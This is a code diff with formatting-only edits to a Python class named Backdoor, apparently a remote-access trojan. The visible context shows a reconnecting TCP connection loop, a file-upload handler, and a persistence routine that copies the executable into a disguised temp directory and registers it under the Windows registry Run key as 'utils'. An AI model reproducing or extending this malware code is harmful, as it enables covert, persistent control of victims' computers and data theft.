@@ -135,7 +135,6 @@ class Backdoor:
         index = 0
 
         while succeeded is False and self.is_date_changed is False:
-
             try:
                 # TCP Connection
                 self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -196,7 +195,6 @@ class Backdoor:
             return "[+] Upload successful"
 
     def __become_persistent(self):
-
         try:
             dirname = os.environ["temp"] + "\\EFD58DB1-29ZZ-4401-A51A-EE19304E85A5"
             if not os.path.exists(dirname):
@@ -205,8 +203,8 @@ class Backdoor:
             if not os.path.exists(location):
                 shutil.copyfile(sys.executable, location)
                 subprocess.call(
-                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v utils /t REG_SZ /d "' + location + '"',
-                    shell=True)
+                    'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v utils /t REG_SZ /d "'
+                    + location + '"',shell=True)
         except Exception as msg:
             print("Persistence failed" + str(msg))
 
